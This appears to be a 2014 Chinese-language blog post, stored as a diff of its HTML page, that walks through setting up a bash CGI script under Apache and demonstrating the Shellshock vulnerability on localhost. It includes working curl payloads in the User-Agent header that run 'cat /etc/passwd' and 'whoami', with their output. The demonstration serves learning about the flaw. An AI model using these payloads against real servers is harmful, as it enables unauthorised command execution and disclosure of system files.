@@ -1,0 +1,106 @@
+<!doctype html><html>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge"><title>Bash shock 安全漏洞 - Du, Chengbin's Blog</title><meta name=viewport content="width=device-width,initial-scale=1">
+<meta itemprop=name content="Bash shock 安全漏洞">
+<meta itemprop=description content="昨天从微信上面，看到朋友发的最新的 bash 漏洞信息，感觉真的很可怕，现在互联网公司几乎都有使用到 bash。现在我来带领大家实践一下使用这个漏洞的过程。"><meta itemprop=datePublished content="2014-09-25T00:00:00+08:00">
+<meta itemprop=dateModified content="2014-09-25T00:00:00+08:00">
+<meta itemprop=wordCount content="90">
+<meta itemprop=keywords content="工作,"><meta property="og:title" content="Bash shock 安全漏洞">
+<meta property="og:description" content="昨天从微信上面，看到朋友发的最新的 bash 漏洞信息，感觉真的很可怕，现在互联网公司几乎都有使用到 bash。现在我来带领大家实践一下使用这个漏洞的过程。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dcb9.github.io/posts/2014-09-25-bash-shock/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2014-09-25T00:00:00+08:00">
+<meta property="article:modified_time" content="2014-09-25T00:00:00+08:00">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Bash shock 安全漏洞">
+<meta name=twitter:description content="昨天从微信上面，看到朋友发的最新的 bash 漏洞信息，感觉真的很可怕，现在互联网公司几乎都有使用到 bash。现在我来带领大家实践一下使用这个漏洞的过程。">
+<link href="https://fonts.googleapis.com/css?family=Playfair+Display:700" rel=stylesheet type=text/css>
+<link rel=stylesheet type=text/css media=screen href=https://dcb9.github.iocss/normalize.css>
+<link rel=stylesheet type=text/css media=screen href=https://dcb9.github.iocss/main.css>
+<link rel=stylesheet type=text/css href=https://dcb9.github.iocss/katex.min.css>
+<link id=dark-scheme rel=stylesheet type=text/css href=https://dcb9.github.iocss/dark.css>
+<script src=https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js></script>
+<script src=https://dcb9.github.iojs/main.js></script><script src=https://dcb9.github.iojs/katex.min.js></script><script src=https://dcb9.github.iojs/auto-render.min.js></script><script src=https://dcb9.github.iojs/custom.js></script>
+</head>
+<body>
+<div class="container wrapper">
+<div class=header>
+<h1 class=site-title><a href=https://dcb9.github.io>Du, Chengbin's Blog</a></h1>
+<div class=site-description><p>A software engineer</p><nav class="nav social">
+<ul class=flat><li><a href=https://github.com/dcb9 title=Github><i data-feather=github></i></a></li><li><a href=https://twitter.com/robertduu title=Twitter><i data-feather=twitter></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li></ul>
+</nav>
+</div>
+<nav class=nav>
+<ul class=flat>
+<li>
+<a href=/>Home</a>
+</li>
+<li>
+<a href=/posts>All posts</a>
+</li>
+<li>
+<a href=/about>About</a>
+</li>
+<li>
+<a href=/tags>Tags</a>
+</li>
+</ul>
+</nav>
+</div>
+<div class=post>
+<div class=post-header>
+<div class=meta>
+<div class=date>
+<span class=day>25</span>
+<span class=rest>Sep 2014</span>
+</div>
+</div>
+<div class=matter>
+<h1 class=title>Bash shock 安全漏洞</h1>
+</div>
+</div>
+<div class=markdown>
+<p>昨天从微信上面，看到朋友发的最新的 bash 漏洞信息，感觉真的很可怕，现在互联网公司几乎都有使用到 bash。现在我来带领大家实践一下使用这个漏洞的过程。</p>
+<h3 id=使-apache-支持-bash-cgi>使 Apache 支持 Bash CGI</h3>
+<p>首先要确认 Apache 里面的 CGI 模块已经被载入 在 httpd.conf 里面有一句：<code>LoadModule cgi_module modules/mod_cgi.so</code> 这个必须有，然后搜索 cgi-bin 如果没有的话添加一段 <code>ScriptAlias /cgi-bin/ "/var/www/cgi-bin"</code></p>
+<h3 id=测试-bash-cgi-hello-world>测试 bash cgi Hello world</h3>
+<p>编辑文件：<code>$ vim /var/www/cgi-bin/hello.cgi</code></p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#00f>#!/bin/bash
+</span><span style=color:#00f></span>echo Content-type: text/html
+echo <span style=color:#a31515>&#34;&#34;</span>
+echo Hello, world.
+</code></pre></div><p>执行以下命令：</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ chmod 755 /var/www/cgi-bin/hello.cgi<span style=color:#a31515>`</span>
+$ curl localhost/cgi-bin/hello.cgi
+输出以下内容则代表Apache已经支持CGI了，就可以继续我们下面的测试
+Hello, world.
+</code></pre></div><h3 id=最可怕的测试>最可怕的测试</h3>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -A <span style=color:#a31515>&#34;() { :; }; echo ; /bin/cat /etc/passwd&#34;</span> http://localhost/cgi-bin/hello.cgi
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/bin/false
+daemon:x:2:2:daemon:/sbin:/bin/false
+adm:x:3:4:adm:/var/adm:/bin/false
+lp:x:4:7:lp:/var/spool/lpd:/bin/false
+... ...
+
+$ curl -A <span style=color:#a31515>&#34;() { :; }; echo ; /usr/bin/whoami&#34;</span> http://localhost/cgi-bin/hello.cgi
+apache
+</code></pre></div><p>有牛人对这个漏洞进行了分析，本人表示看不懂，可以看一下
+<a href=http://weibo.com/p/1001603758737234992740>Bash 3.0-4.3命令执行漏洞分析（by@知道创宇 lu4nx）</a></p>
+<p>modifyed</p>
+</div>
+<div class=tags>
+<ul class=flat>
+<li><a href=/tags/%E5%B7%A5%E4%BD%9C>工作</a></li>
+</ul>
+</div></div>
+</div>
+<div class="footer wrapper">
+<nav class=nav>
+<div>2022 © Copyright Du, Chengbin | <a href=https://github.com/knadh/hugo-ink>Ink</a> theme on <a href=https://gohugo.io>Hugo</a></div>
+</nav>
+</div>
+<script>feather.replace()</script>
+</body>
+</html>
